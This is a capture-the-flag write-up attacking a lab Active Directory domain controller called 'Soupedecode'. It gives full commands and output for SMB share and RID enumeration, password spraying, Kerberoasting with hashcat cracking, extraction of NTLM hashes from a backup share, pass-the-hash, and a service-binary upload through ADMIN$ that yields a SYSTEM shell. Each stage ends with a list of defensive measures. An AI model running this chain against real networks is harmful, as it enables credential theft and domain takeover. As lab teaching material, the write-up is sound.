**Soupedecode**

Attack path: navigating through SMB shares, performing password spraying and Kerberos authentication, and utilizing Pass-the-Hash.

**Network Recon**
=================
```
nmap -sS -p- TARGET_IP
```
```
Host is up (0.00025s latency).
Not shown: 65517 filtered TCP ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49675/tcp open  unknown
49733/tcp open  unknown
49850/tcp open  unknown
```
Remote administrator protocols: 445, 3389.

Defensive Perspective:
- Limit exposed services with proper firewall rules.
- Monitor for full-port scans with IDS/IPS.
- Restrict RDP (3389) access to trusted IPs or VPN only.
- Harden SMB (445) with strict authentication and auditing.

**Service Fingerprint**
======================
```
nmap -sS -sC -sV -p 53,88,135,139,389,445,464,593,636,3389,3268,3269 TARGET_IP
```
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-17 11:02:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-17T11:02:11+00:00
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-07-16T10:50:39
|_Not valid after:  2027-01-15T10:50:39
|_ssl-date: 2026-07-17T11:02:51+00:00; 0s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Output confirmed the target was a domain controller: DC01.SOUPEDECODE.LOCAL

Defensive Perspective
- Enforce SMB signing across all hosts.
- Disable LLMNR/NBNS to reduce spoofing risk.
- Regularly audit domain controllers for exposed services.

**SMB Enumeration**
==================
```
nxc smb soupedecode.local -u guest -p '' --shares
```
Guest had IPC$ read permission.

<img width="764" height="189" alt="soupedecode_1_smb_guest_share" src="https://github.com/user-attachments/assets/e7161089-55d7-4d9b-a1f5-eb9f2f5bb93b" />

Defensive Perspective
- Disable guest/anonymous access.
- Audit share permissions regularly.
- Monitor for attempts to enumerate shares with null sessions.
- Checked if anonymous or guest login was available:

**Username Enumeration**
=======================
RID cycling to extract domain users:
```
nxc smb soupedecode.local -u guest -p '' --rid > userlist.txt
```
<img width="938" height="107" alt="soupedecode_1_smb_guest_rid" src="https://github.com/user-attachments/assets/52c02a71-c456-4dd4-8b45-89f20a353590" />

Extracted usernames:
```
grep 'SOUPEDECODE\\' userlist.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```
Sample output
```
Enterprise Read-only Domain Controllers
Administrator
Guest
krbtgt
Domain Admins
```

Defensive Perspective
- Restrict RID cycling by limiting guest/anonymous access.
- Monitor for excessive RID requests.
- Use honey accounts to detect enumeration attempts.

**Dictionary Attack**
====================
```
nxc smb soupedecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success | grep '[+]' > creds.txt
```
```
nxc smb soupedecode.local -u ybob317 -p 'redacted' --shares
```
<img width="835" height="201" alt="soupedecode_1_smb_ybob317_share" src="https://github.com/user-attachments/assets/54152d3a-db05-4021-87b5-bd9891a6063c" />

ybob317 users read permission
```
smbclient //TARGET_IP/Users -U 'ybob317%redated'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jul  4 22:48:22 2024
  ..                                DHS        0  Fri Jul 17 14:10:44 2026
  admin                               D        0  Thu Jul  4 22:49:01 2024
  Administrator                       D        0  Fri Jul 25 17:45:10 2025
  All Users                       DHSrn        0  Sat May  8 08:26:16 2021
  Default                           DHR        0  Sun Jun 16 02:51:08 2024
  Default User                    DHSrn        0  Sat May  8 08:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 08:14:03 2021
  Public                             DR        0  Sat Jun 15 17:54:32 2024
  ybob317                             D        0  Mon Jun 17 17:24:32 2024

		12942591 blocks of size 4096. 10705055 blocks available
smb: \> 
```
Successful login with user ybob317.

Defensive Perspective
- Implement account lockout policies.
- Use MFA to prevent password spraying success.
- Monitor for repeated failed logins across multiple accounts.

**Kerberoasting Attack**
=======================
```
GetUserSPNs.py soupedecode.local/ybob317:redacted -dc-ip TARGET_DC_IP -request-user file_svc -output hash.txt

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
FTP/FileServer        file_svc            2024-06-17 17:32:23.726085  <never>               

[-] CCache file is not found. Skipping...

```
```
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```
Cracked service account file_svc with rockyou.txt
```
nxc smb TARGET_IP -u file_svc -p 'Redacted' --shares
```
<img width="785" height="194" alt="soupedecode_1_smb_file_svc_share" src="https://github.com/user-attachments/assets/1b99d750-78a4-4a6c-8ad7-8973dc7940bb" />

```
smbclient //TARGET_IP/backup -U 'file_svc%redaced'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 17:41:17 2024
  ..                                 DR        0  Fri Jul 25 17:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 08:41:05 2024

		12942591 blocks of size 4096. 10705055 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (54.4 KiloBytes/sec) (average 54.4 KiloBytes/sec)
smb: \> 

```
Defensive Perspective
- Use long, complex passwords for service accounts.
- Rotate service account credentials regularly.
- Monitor for abnormal Kerberos ticket requests.

**Pass-the-Hash Attack**
======================
Extracted NTLM hashes from backup share:
```
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
```
Authenticated with hashes:
```
nxc smb TARGET_IP -u extracted_users.txt -H ntlm-hashes.txt --no-brute
```
<img width="943" height="141" alt="soupedecode_1_pth_fileserver" src="https://github.com/user-attachments/assets/28305811-019b-4fa5-b11a-f915cc88b212" />

Defensive Perspective
- Enforce credential guard and restrict NTLM usage.
- Monitor for hash-based authentication attempts.
- Regularly clear cached credentials and enforce Kerberos-only authentication where possible.

**Escalate Privilege**
======================
```
smbclient.py soupedecode.local/fileserver$@TARGET_IP -hashes ':e41da7e79[redacted]9cf79d1cb325559'
[*] Requesting shares on dc01.soupedecode.local.....
[*] Found writable share ADMIN$
[*] Uploading file wbGmNLkl.exe
[*] Opening SVCManager on dc01.soupedecode.local.....
[*] Creating service MGrn on dc01.soupedecode.local.....
[*] Starting service MGrn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```
Uploaded malicious service binary via ADMIN$ share, executed, and obtained NT AUTHORITY\SYSTEM shell.

Defensive Perspective
- Restrict administrative shares (ADMIN$, C$) to domain admins only.
- Monitor for service creation events (Event ID 7045).
- Implement application whitelisting to block unauthorized executables.
- Use EDR solutions to detect suspicious lateral movement and privilege escalation.
